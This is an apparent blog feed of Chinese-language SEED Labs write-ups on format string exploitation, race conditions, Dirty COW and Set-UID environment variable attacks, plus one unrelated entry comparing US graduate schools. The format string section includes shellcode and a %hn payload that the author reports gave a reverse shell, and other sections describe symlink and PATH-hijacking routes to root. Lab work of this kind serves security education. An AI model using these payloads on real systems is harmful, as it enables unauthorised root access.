class="hljs-string">"\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"</span>   <span class="hljs-string">"\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"</span>   <span class="hljs-string">"\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"</span>   <span class="hljs-string">"\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *   <span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"AAAAAAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBBBBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCCCCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDDDDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')N = <span class="hljs-number">1500</span># Fill the content with NOP<span class="hljs-number">'</span>scontent = bytearray(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i in range(N))# Choose the shellcode version based on your targetshellcode = shellcode_32# Put the shellcode somewhere in the payloadstart = <span class="hljs-number">0x100</span>             # Change <span class="hljs-keyword">this</span> numbercontent[start:start + len(shellcode)] = shellcode##############################################################    Construct the format <span class="hljs-built_in">string</span> here# ############################################################ret_low = <span class="hljs-number">0xFFFFD57C</span>content[0:4]  =  (ret_low).to_bytes(4,byteorder='little')ret_high = <span class="hljs-number">0xFFFFD57E</span>content[4:8]  =  (ret_high).to_bytes(4,byteorder='little')s = <span class="hljs-string">"%55112x%64$hn%10415x%65$hn"</span>fmt  = (s).encode('latin-1')content[<span class="hljs-number">8</span>:<span class="hljs-number">8</span>+len(fmt)] = fmt# Save the format <span class="hljs-built_in">string</span> to filewith open('badfile', 'wb') as f:  f.<span class="hljs-built_in">write</span>(content)</code></pre><p><img src="/2021/05/12/Format-String-lab-1/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到reverse shell成功</p><h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>您的工作是构造有效负载以利用服务器的格式字符串漏洞。您的最终目标是在目标服务器上获得一个根shell。</p><p>首先就是先打印出来栈上面的信息</p><p><img src="/2021/05/12/Format-String-lab-1/19.PNG" srcset="/img/loading.gif" alt="19"></p><p>然后发现buffer起始位置是第34个参数</p><p>然后开始找return address的位置，根据提示信息中的frame pointer来找，frame pointer是0x00007fffffffe4c0，所以return address所在的位置就应该是0x00007fffffffe4c8</p><h4 id="问题-amp-解决"><a href="#问题-amp-解决" class="headerlink" title="问题&amp;解决"></a>问题&amp;解决</h4><p>printf在遇一个字节的0的时候会停止解析，<strong>解决方法就是将对应的地址放在buffer的比较高的地方</strong></p><p>要修改位于<code>0x00007fffffffe4c8</code>的return address的值，仍然将shellcode放在距离buffer0x100的地方，所以此时shellcode的起始位置是<code>0x00007fffffffe680</code></p><p>所以0x00007fffffffe4c8的低两位需要放0xe680，0x00007fffffffe4cA的中两位需要放0xffff，0x00007fffffffe4cc的高两位放0x7fff，最高位放0x0000</p><p>按照这个来修改对应文件，在这里没有贴上来，搞清思路了就基本没有什么难点。关于printf具体实现，可参考：<a href="https://blog.csdn.net/zhengqijun_/article/details/72454714" target="_blank" rel="noopener">printf 函数实现的深入剖析</a></p><p>然后运行结果如下：</p><p><img src="/2021/05/12/Format-String-lab-1/20.PNG" srcset="/img/loading.gif" alt="20"></p><p>可以看到reverse shell成功</p><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p>warning信息</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">a</span> <span class="hljs-keyword">string</span> literal <span class="hljs-keyword">and</span> no <span class="hljs-built_in">format</span> arguments</code></pre><p>是在说不是在格式化参数，解决方案，改为printf（“%s”,msg）即可，此时没有warning</p><p><img src="/2021/05/12/Format-String-lab-1/21.PNG" srcset="/img/loading.gif" alt="21"></p><p><img src="/2021/05/12/Format-String-lab-1/22.PNG" srcset="/img/loading.gif" alt="22"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Format-String&quot;&gt;&lt;a href=&quot;#Format-String&quot; class=&quot;headerlink&quot; title=&quot;Format String&quot;&gt;&lt;/a&gt;Format String&lt;/h1&gt;&lt;h2 id=&quot;overview&quot;&gt;&lt;a href=&quot;#o</summary>
      
    
    
    
    
    <category term="Software security" scheme="http://yoursite.com/tags/Software-security/"/>
    
  </entry>
  
  <entry>
    <title>The information of School</title>
    <link href="http://yoursite.com/2021/05/07/The-information-of-School/"/>
    <id>http://yoursite.com/2021/05/07/The-information-of-School/</id>
    <published>2021-05-07T13:50:42.000Z</published>
    <updated>2021-05-08T12:46:06.089Z</updated>
    
    <content type="html"><![CDATA[<h2 id="USC（南加州大学）"><a href="#USC（南加州大学）" class="headerlink" title="USC（南加州大学）"></a>USC（南加州大学）</h2><h3 id="综述："><a href="#综述：" class="headerlink" title="综述："></a>综述：</h3><p><strong>针对南加州大学来说，缺少的信息在于没有具体的GPA以及TOEFL、GRE要求，但是能够找到相应的课程</strong></p><p>还有就是很多项目在第一轮筛选的时候就不是target，所以就没有将信息放上去</p><p>每个项目后面的*的数量代表优先程度</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/" target="_blank" rel="noopener">项目链接</a></p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/computer-science-general/" target="_blank" rel="noopener">M.S. Computer Science (General)</a>    （*根据课程来看不是很感兴趣）</p><ul><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/artificial-intelligence/" target="_blank" rel="noopener">AI</a>（4 * 感兴趣，属于第一档）</p><p><img src="/2021/05/07/The-information-of-School/1.PNG" srcset="/img/loading.gif" alt="1"></p></li></ul></li><li><p><a href="https://www.cs.usc.edu/academic-programs/masters/intelligent-robotics/" target="_blank" rel="noopener">Intelligent Robotics</a>（2 * 半）</p><p>  <img src="/2021/05/07/The-information-of-School/2.PNG" srcset="/img/loading.gif" alt="2"></p></li></ul></li></ul><h2 id="uchicago（芝加哥大学）"><a href="#uchicago（芝加哥大学）" class="headerlink" title="uchicago（芝加哥大学）"></a>uchicago（芝加哥大学）</h2><h3 id="综述：-1"><a href="#综述：-1" class="headerlink" title="综述："></a>综述：</h3><p><strong>信息浏览过之后发现就俩项目，而且MPCS（master program of computer science）和CAPP，看完课程信息之后感觉都不是特别合适</strong></p><h2 id="uci（加州大学欧文分校）"><a href="#uci（加州大学欧文分校）" class="headerlink" title="uci（加州大学欧文分校）"></a>uci（加州大学欧文分校）</h2><h3 id="综述：-2"><a href="#综述：-2" class="headerlink" title="综述："></a>综述：</h3><p><strong>Computer Science方面的项目比较少</strong></p><ul><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_ms/#text" target="_blank" rel="noopener">Computer Science, M.S</a>.（2 *半）</p><p>  <img src="/2021/05/07/The-information-of-School/3.PNG" srcset="/img/loading.gif" alt="3"></p></li><li><p><a href="http://catalogue.uci.edu/donaldbrenschoolofinformationandcomputersciences/departmentofcomputerscience/computerscience_master/#requirementstext" target="_blank" rel="noopener">Master of Computer Science</a>（勉强3 *）</p></li></ul><p><img src="/2021/05/07/The-information-of-School/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/05/07/The-information-of-School/5.PNG" srcset="/img/loading.gif" alt="5"></p><h2 id="Northwestern-University（西北大学）待补充"><a href="#Northwestern-University（西北大学）待补充" class="headerlink" title="Northwestern University（西北大学）待补充"></a>Northwestern University（西北大学）待补充</h2><h3 id="综述：-3"><a href="#综述：-3" class="headerlink" title="综述："></a>综述：</h3><ul><li>Master of Science in Computer Science (MS)</li></ul><h2 id="Duke（杜克大学）"><a href="#Duke（杜克大学）" class="headerlink" title="Duke（杜克大学）"></a>Duke（杜克大学）</h2><h3 id="综述：-4"><a href="#综述：-4" class="headerlink" title="综述："></a>综述：</h3><p><strong>MS in Computer Science和MS in Economics and Computation，只有两个项目，并且第一个项目没有具体的信息，</strong></p><p><strong>暂时对杜克无感，觉得也申不上。。。</strong></p><h2 id="brown（布朗大学）需帮助补充"><a href="#brown（布朗大学）需帮助补充" class="headerlink" title="brown（布朗大学）需帮助补充"></a>brown（布朗大学）需帮助补充</h2><h3 id="综述：-5"><a href="#综述：-5" class="headerlink" title="综述："></a>综述：</h3><p><strong>项目较少并且没有找到相关的课程设置，同时未找到录取相关推荐信要求以及GPA</strong></p><ul><li>the <a href="https://cs.brown.edu/degrees/masters" target="_blank" rel="noopener">Master of Science in Computer Science</a></li></ul><h2 id="RICE（莱斯大学）"><a href="#RICE（莱斯大学）" class="headerlink" title="RICE（莱斯大学）"></a>RICE（莱斯大学）</h2><h3 id="综述：-6"><a href="#综述：-6" class="headerlink" title="综述："></a>综述：</h3><p><strong>program太少，而且要么是面向就业，要么是profession，专业硕士</strong></p><ul><li>录取要求：<strong>至少三封推荐信，托福最少90</strong></li><li><a href="https://csweb.rice.edu/academics/graduate-programs/professional-masters-programs" target="_blank" rel="noopener">Master of Computer Science Program</a>（面向就业的，先给2 *）</li></ul><h2 id="Yale（耶鲁大学）"><a href="#Yale（耶鲁大学）" class="headerlink" title="Yale（耶鲁大学）"></a>Yale（耶鲁大学）</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;USC（南加州大学）&quot;&gt;&lt;a href=&quot;#USC（南加州大学）&quot; class=&quot;headerlink&quot; title=&quot;USC（南加州大学）&quot;&gt;&lt;/a&gt;USC（南加州大学）&lt;/h2&gt;&lt;h3 id=&quot;综述：&quot;&gt;&lt;a href=&quot;#综述：&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="School Information" scheme="http://yoursite.com/tags/School-Information/"/>
    
  </entry>
  
  <entry>
    <title>Race Condition</title>
    <link href="http://yoursite.com/2021/04/21/Race-Condition/"/>
    <id>http://yoursite.com/2021/04/21/Race-Condition/</id>
    <published>2021-04-21T06:14:21.000Z</published>
    <updated>2021-04-29T07:51:16.711Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><blockquote><p> A race condition occurs when multiple processes access and manipulate the same data concurrently, and the outcome of the execution depends on the particular order in which the access takes place. If a privileged program has a race-condition vulnerability, attackers can run a parallel process to “race” against the privileged program, with an intention to change the behaviors of the program.</p></blockquote><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><img src="/2021/04/21/Race-Condition/1.PNG" srcset="/img/loading.gif" alt="1"></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><h3 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h3><p><img src="/2021/04/21/Race-Condition/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h3><blockquote><p>The ultimate goal is to gain the root privilege. The most critical step of the attack, making /tmp/XYZ point to the password file, must occur within the window between check and use; namely between the access and fopen calls in the vulnerable program.</p></blockquote><h4 id="Task-2-A-Simulating-a-Slow-Machine"><a href="#Task-2-A-Simulating-a-Slow-Machine" class="headerlink" title="Task 2.A: Simulating a Slow Machine"></a>Task 2.A: Simulating a Slow Machine</h4><p>最开始的时候需要将/tmp/XYZ连接到/dev/null，这样才会保证能够进入到access函数当中</p><p><img src="/2021/04/21/Race-Condition/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>然后此时可以进行写入，但是需要在休眠10s的时候修改符号链接</p><p><img src="/2021/04/21/Race-Condition/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/21/Race-Condition/5.PNG" srcset="/img/loading.gif" alt="5"></p><p><img src="/2021/04/21/Race-Condition/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到对应的字符串已经添加到了目标文件当中</p><h4 id="Task-2-B-The-Real-Attack"><a href="#Task-2-B-The-Real-Attack" class="headerlink" title="Task 2.B: The Real Attack"></a>Task 2.B: The Real Attack</h4><blockquote><p>The typical strategy in race condition attacks is to run the attack program in parallel to the target program, hoping to be able to do the critical step within that time window. </p></blockquote><p>the malicious.c code</p><p><img src="/2021/04/21/Race-Condition/8.PNG" srcset="/img/loading.gif" alt="8"></p><p>and the what we need to do is modifying the .sh and run it parallelly</p><p><img src="/2021/04/21/Race-Condition/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/04/21/Race-Condition/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>we can find that the passwd has already been changed</p><h4 id="Task-2-C-An-Improved-Attack-Method"><a href="#Task-2-C-An-Improved-Attack-Method" class="headerlink" title="Task 2.C: An Improved Attack Method"></a>Task 2.C: An Improved Attack Method</h4><blockquote><p>如果XYZ变成root的，攻击将不会成功，因为使用seed权限运行的攻击程序将无法再取消链接。这是因为/tmp文件夹上有一个“sticky”位，这意味着只有文件的所有者才能删除该文件，即使该文件夹是可写的。</p><p>出现这种情况的主要原因是，攻击程序在unlink之后，symlink之前，上下文就被关闭了。因为这两个操作不是原子的，所以如果上下文切换发生在两者之间，目标Set UID程序有机会运行open函数，它将创建一个以root为所有者的新文件。之后，攻击程序将无法再对/tmp/XYZ进行更改。</p></blockquote><p>为解决上述问题，将两个操作变为原子的，具体如下。不断改变XYZ链接的文件，实现攻击的条件。</p><p><img src="/2021/04/21/Race-Condition/11.PNG" srcset="/img/loading.gif" alt="11"></p><p><img src="/2021/04/21/Race-Condition/10.PNG" srcset="/img/loading.gif" alt="10"></p><p><img src="/2021/04/21/Race-Condition/12.PNG" srcset="/img/loading.gif" alt="12"></p><h3 id="Task-3-Countermeasures"><a href="#Task-3-Countermeasures" class="headerlink" title="Task 3: Countermeasures"></a>Task 3: Countermeasures</h3><h4 id="Task-3-A-Applying-the-Principle-of-Least-Privilege"><a href="#Task-3-A-Applying-the-Principle-of-Least-Privilege" class="headerlink" title="Task 3.A: Applying the Principle of Least Privilege"></a>Task 3.A: Applying the Principle of Least Privilege</h4><p><img src="/2021/04/21/Race-Condition/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/04/21/Race-Condition/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>no permission occur when it cannot open the file. And when it links to /dev/null, it can pass the accsee(), but there is no root privilege to modify the file</p><h4 id="Task-3-B-Using-Ubuntu’s-Built-in-Scheme"><a href="#Task-3-B-Using-Ubuntu’s-Built-in-Scheme" class="headerlink" title="Task 3.B: Using Ubuntu’s Built-in Scheme"></a>Task 3.B: Using Ubuntu’s Built-in Scheme</h4><p><img src="/2021/04/21/Race-Condition/15.PNG" srcset="/img/loading.gif" alt="15"></p><p>打开内置保护后，攻击也会失败。当保护机制打开时，满足以下条件之一才允许跟随符号链接：</p><ul><li><p>符号链接所在文件夹不是“黏性”的</p></li><li><p>符号链接的uid和follower匹配</p></li><li><p>符号链接的所有者和文件夹的所有者匹配</p></li></ul><h1 id="Dirty-Cow"><a href="#Dirty-Cow" class="headerlink" title="Dirty Cow"></a>Dirty Cow</h1><p><img src="/2021/04/21/Race-Condition/16.PNG" srcset="/img/loading.gif" alt="16"></p><h3 id="Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><a href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege" class="headerlink" title="Task 2: Modify the Password File to Gain the Root Privilege"></a>Task 2: Modify the Password File to Gain the Root Privilege</h3><p><img src="/2021/04/21/Race-Condition/17.PNG" srcset="/img/loading.gif" alt="17"></p><p><img src="/2021/04/21/Race-Condition/18.PNG" srcset="/img/loading.gif" alt="18"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Overview&quot;&gt;&lt;a href=&quot;#Overview&quot; class=&quot;headerlink&quot; title=&quot;Overview&quot;&gt;&lt;/a&gt;Overview&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; A race condition occurs when mul</summary>
      
    
    
    
    
    <category term="software security" scheme="http://yoursite.com/tags/software-security/"/>
    
  </entry>
  
  <entry>
    <title>environment variable and set-uid program</title>
    <link href="http://yoursite.com/2021/04/11/environment-variable-and-set-uid-program/"/>
    <id>http://yoursite.com/2021/04/11/environment-variable-and-set-uid-program/</id>
    <published>2021-04-11T12:30:49.000Z</published>
    <updated>2021-04-15T05:39:28.428Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="task-1：manipulate-environment-variable"><a href="#task-1：manipulate-environment-variable" class="headerlink" title="task 1：manipulate environment variable"></a>task 1：manipulate environment variable</h3><ul><li>打印环境变量</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/1.PNG" srcset="/img/loading.gif" alt="1"></p><ul><li>使用export和unset来设置和取消设置环境变量</li></ul><blockquote><p>这两条命令不是单独的程序，是bash的内部命令，而shell默认的程序是/bin/bash</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="task2：Passing-environment-variable"><a href="#task2：Passing-environment-variable" class="headerlink" title="task2：Passing environment variable"></a>task2：Passing environment variable</h3><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1"></a>step 1</h4><p>对program进行编译，这个program会使得它的子进程打印出来字符指针数组的信息</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/3.PNG" srcset="/img/loading.gif" alt="3"></p><p>可以看到，相应的环境变量的信息是被打印出来了，之后将这些信息存储在文件当中</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2"></a>step 2</h4><p>修改之后重新进行编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/4.PNG" srcset="/img/loading.gif" alt="4"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/5.PNG" srcset="/img/loading.gif" alt="5"></p><p>然后存储在file1文件当中</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3"></a>step 3</h4><p>之后通过<code>diff file file1</code>来进行对比，会看到除了第48行中可执行文件的名字不同之外，environment variable并没有区别</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>总结，通过fork()产生的子进程拥有和父进程完全一致的环境变量</p><h3 id="task-3：Environment-Variables-and-execve"><a href="#task-3：Environment-Variables-and-execve" class="headerlink" title="task 3：Environment Variables and execve()"></a>task 3：Environment Variables and execve()</h3><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1"></a>step 1</h4><p>在这个task当中，我们所要研究的是exevce()函数以及在调用前后environment variable的变化</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>此时，不打印任何东西，分析原因，会发现是由于在execve当中传递的第三个指针数组为空，所以此时没有环境变量可打印</p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2"></a>step 2</h4><p>修改指针数组内容为全局环境变量，可以看到相应的变量信息被打印出来</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3"></a>step 3</h4><p>再次修改传递的指针数组的内容，之后编译运行</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，新的环境变量就是我们所设置的指针数组里面的内容</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>总结：通过execve()运行的新的进程是通过指针数组，以传参的形式获取environment variable的</p><h3 id="task-4：Environment-Variables-and-system"><a href="#task-4：Environment-Variables-and-system" class="headerlink" title="task 4：Environment Variables and system()"></a>task 4：Environment Variables and system()</h3><p>逻辑是这样的，system()和execve()类似，调用一个新的程序，只不过system()已经设置好了所需要调用的文件/bin/sh，而system()回调用execl()函数，而execl()则会调用execve()函数</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/12.PNG" srcset="/img/loading.gif" alt="12"></p><p>而如果直接运行该命令，可以看到输出的内容是一样的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/13.PNG" srcset="/img/loading.gif" alt="13"></p><p>总结：当我们运行system()函数的时候，抛开外表，也是通过传递指针数组的形式来传递环境变量的</p><h3 id="Task-5-Environment-Variable-and-Set-UID-Programs"><a href="#Task-5-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 5: Environment Variable and Set-UID Programs"></a>Task 5: Environment Variable and Set-UID Programs</h3><p>在这个task当中，我们aim at <code>set-uid</code>程序是否会继承来自用户程序的environment variable，关于set-uid程序，参考<a href="https://www.cnblogs.com/bwangel23/p/4225818.html" target="_blank" rel="noopener">setuid函数解析</a></p><h4 id="step-1-2"><a href="#step-1-2" class="headerlink" title="step 1"></a>step 1</h4><p><img src="/2021/04/11/environment-variable-and-set-uid-program/14.PNG" srcset="/img/loading.gif" alt="14"></p><h4 id="step-2-2"><a href="#step-2-2" class="headerlink" title="step 2"></a>step 2</h4><p>之后需要让这个program具有root权限以及使它成为一个<code>Set-UID</code>程序</p><blockquote><p>chmod 4755与chmod 755对比多了附加权限值4，这个4表示其他用户执行文件时，具有与所有者同样的权限（设置了SUID）。</p><p>为什么要设置4755 而不是 755？<br>假设netlogin是root用户创建的一个上网认证程序，如果其他用户要上网也要用到这个程序，那就需要root用户运行chmod 755 netlogin命令使其他用户也能运行netlogin。但假如netlogin执行时需要访问一些只有root用户才有权访问的文件，那么其他用户执行netlogin时可能因为权限不够还是不能上网。这种情况下，就可以用 chmod 4755 netlogin 设置其他用户在执行netlogin也有root用户的权限，从而顺利上网。</p></blockquote><p><img src="/2021/04/11/environment-variable-and-set-uid-program/15.PNG" srcset="/img/loading.gif" alt="15"></p><h4 id="step-3-2"><a href="#step-3-2" class="headerlink" title="step 3"></a>step 3</h4><p>把对应的environment variable在用户环境下设置好</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/16.PNG" srcset="/img/loading.gif" alt="16"></p><p>之后运行，可以看到我们设置的environment variable中的MYSHELL是被打印出来了，说明该环境变量是从shell 程序当中继承过来的</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/17.png" srcset="/img/loading.gif" alt="17"></p><p>修改一下code，然后依旧给他root的权限以及set-uid的权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/19.PNG" srcset="/img/loading.gif" alt="19"></p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/18.PNG" srcset="/img/loading.gif" alt="18"></p><p>可以看到，我们能找到PATH以及自己定义的环境变量，无法找到第二个环境变量LD LIBRARY PATH</p><h4 id="为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢"><a href="#为什么LD-LIBRARY-PATH环境变量不会被包含到子进程的环境变量中呢" class="headerlink" title="为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?"></a>为什么LD_LIBRARY_PATH环境变量不会被包含到子进程的环境变量中呢?</h4><p>参考blog：<a href="https://blog.csdn.net/C_Ronaldo__/article/details/112506896?utm_medium=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase&depth_1-utm_source=distribute.pc_relevant_download.none-task-blog-baidujs-1.nonecase" target="_blank" rel="noopener">SEEDLab Environment Variable and Set-UID Program Lab 实验报告</a></p><h3 id="Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs"><a href="#Task-6-The-PATH-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 6: The PATH Environment Variable and Set-UID Programs"></a>Task 6: The PATH Environment Variable and Set-UID Programs</h3><p>首先，task6告诉我们在set-uid当中调用sytem()函数是很危险的，因为shell程序可能会受到环境变量的影响。</p><p>攻击逻辑是这样的，我们通过修改环境变量来针对于set-uid程序进行攻击（其实实际上是针对于set-uid程序当中的system()函数来进行的）</p><ul><li>step1</li></ul><p>首先，code进行编译运行，注意在这里为防止/bin/sh的不在set-uid当中执行的策略，我们需要</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;   system(<span class="hljs-string">"ls"</span>);   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><img src="/2021/04/11/environment-variable-and-set-uid-program/20.PNG" srcset="/img/loading.gif" alt="20"></p><ul><li>step2</li></ul><p>接下来，我们aim at如何执行自己的恶意代码而不是/bin/ls，并且能否获得root权限</p><p>第一个攻击的点在于ls命令是相对寻址的，而不是根据绝对地址来进行运行，所以可以在寻找命令的时候让解析器去找我们所想要执行的恶意代码，需要修改PATH路径，同时，为了得到root权限，我们需要由前两个lab一样呢进行reverse shell下面是具体步骤</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/22.PNG" srcset="/img/loading.gif" alt="22"></p><p>首先，在reverse shell当中，都是执行/bin/sh，通过上面命令来讲/bin/sh文件复制到<code>/home/seed/Desktop/lab3/Labsetup</code>当中，并且重命名为ls</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/23.PNG" srcset="/img/loading.gif" alt="23"></p><p>之后将相对路径加入到PATH环境变量当中，可以看到会首先寻找我的相对路径，之后再次运行task6，就可以获得root权限</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/21.PNG" srcset="/img/loading.gif" alt="21"></p><p>总结：在这一步当中，我们利用了environment variable中的PATH变量来针对ls命令进行攻击，并且通过set-uid程序获得了root权限</p><h3 id="Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs"><a href="#Task-7-The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs" class="headerlink" title="Task 7: The LD PRELOAD Environment Variable and Set-UID Programs"></a>Task 7: The LD PRELOAD Environment Variable and Set-UID Programs</h3><p>task7先告诉了我们LD_PRELOAD这个环境变量是用来加载用户指定的共享库的，并且是优先于其他所有的动态库的，下面来看一下具体是如何影响的以及我们能怎么利用</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><h4 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1"></a>step 1</h4><p>首先按照步骤建立连接库并且修改LD_PRELOAD环境变量</p><p><img src="/2021/04/11/environment-variable-and-set-uid-program/24.PNG" srcset="/img/loading.gif" alt="24"></p><h4 id="step-2-3"><a href="#step-2-3" class="headerlink" title="step 2"></a>step 2</h4><ul><li>Make myprog a regular program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/25.PNG" srcset="/img/loading.gif" alt="25"></p><p>此时连接到的是我们重新编译之后的库文件</p><ul><li>Make myprog a Set-UID root program, and run it as a normal user.</li></ul><p><img src="/2021/04/11/environment-variable-and-set-uid-program/26.PNG" srcset="/img/loading.gif" alt="26"></p><p>此时，结果是sleep一秒之后退出，连接到的是原来的库文件</p><ul><li><p>Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root account and run it.</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/27.PNG" srcset="/img/loading.gif" alt="27"></p></li></ul><p>此时，在root用户下运行会发现连接到的是重新编译后的库文件</p><ul><li><p>Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account), export the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.<img src="/2021/04/11/environment-variable-and-set-uid-program/28.PNG" srcset="/img/loading.gif" alt="28"></p><p>  创建用户test并且在seed账户中export，此时sleep一秒之后结束程序，连接到的是原来的库文件</p><p>  而当我们是在test账户当中进行export的时候，会发现此时打印消息，连接到的是重新编译后的共享库</p><p>  <img src="/2021/04/11/environment-variable-and-set-uid-program/29.PNG" srcset="/img/loading.gif" alt="29"></p></li></ul><h4 id="step-3-3"><a href="#step-3-3" class="headerlink" title="step 3"></a>step 3</h4><p>在这一步当中，我们aim at背后的机制，可以肯定的是一定和环境变量有关，并且根据hint可以得知，有的子shell可能不会继承父shell的LD*的环境变量，所以设计思路就是在我们myprog.c文件当中打印出LD_PRELOAD的值</p><p>动态链接器防御机制</p><blockquote><p>动态链接器程序有一个防御机制,当进程的真实用户ID与有效用户ID不一样时,或者真实组ID与有效组ID不一致时,进程将会忽略LD_PRELOAD,LD_LIBRARY_PATH环境变量.</p></blockquote><ul><li>针对Make myprog a regular program, and run it as a normal 